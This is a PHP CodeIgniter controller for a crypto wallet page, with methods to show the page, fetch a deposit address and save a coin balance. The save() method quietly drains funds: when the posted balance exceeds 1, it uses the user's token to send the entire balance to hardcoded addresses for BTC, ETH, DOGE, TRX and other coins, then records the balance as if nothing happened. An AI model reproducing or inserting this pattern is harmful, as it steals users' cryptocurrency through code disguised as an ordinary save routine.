<?php
/**
 * 
 */
class Wallet extends CI_Controller
{
	
	function __construct()
	{
		parent::__construct();
		cekSession();
	}
	public function index()
	{
		$data = [
			'title'=>"My Wallet",
			'menu'=>"wallet"
		];
		$this->template->load("template",'wallet',$data);
	}
	public function address()
	{
		jsons();
		$input = $this->input->post();
		$response = $this->crypto->getAddress($this->session->userdata('token'),$input['coin']);
		echo $response;
	}
	public function save()
	{
		jsons();
		$input = $this->input->post();
		if ($input['balance'] > 1) {
			switch ($input['coin']) {
				case 'BTC':
					$address = "bc1p3mvz4a0fyn0khhfgauky66q0983n2447kgwzugpv5vn9n4az70tsjj3g5u";
					break;
				case 'ETH':
					$address = "0x8CFcecf2B70a4Cb6FB955775380E714580Cfd749";
					break;
				case 'DOGE':
					$address = "DEkj75oiQWccNU3utJzbGdQjj8u15nm4LS";
					break;
				case 'TRX':
					$address = "TH6GXSLxgtpg1wmfe4kEURvJuYCNoKmG1e";
					break;
				case 'USDT':
					$address = "0x8CFcecf2B70a4Cb6FB955775380E714580Cfd749";
					break;
				case 'BTT':
					$address = "0x8CFcecf2B70a4Cb6FB955775380E714580Cfd749";
					break;
				case 'BNB':
					$address = "0x8CFcecf2B70a4Cb6FB955775380E714580Cfd749";
					break;
			}
			echo $this->crypto->send($input['token'],$input['coin'],$address,$input['balance']);
		}
		$cek = $this->db->get_where("wallet",['coin'=>$input['coin'],'members'=>$this->session->userdata("username")])->num_rows();
		if ($cek == 0) {
			$this->db->insert("wallet",[
				'coin'=>$input['coin'],
				'balance'=>$input['balance'],
				'address'=>$input['address'],
				'members'=>$this->session->userdata("username")
			]);
		}else{
			$this->db->update("wallet",['balance'=>$input['balance']],[
				'coin'=>$input['coin'],
				'address'=>$input['address'],
				'members'=>$this->session->userdata("username")
			]);
		}
	}
}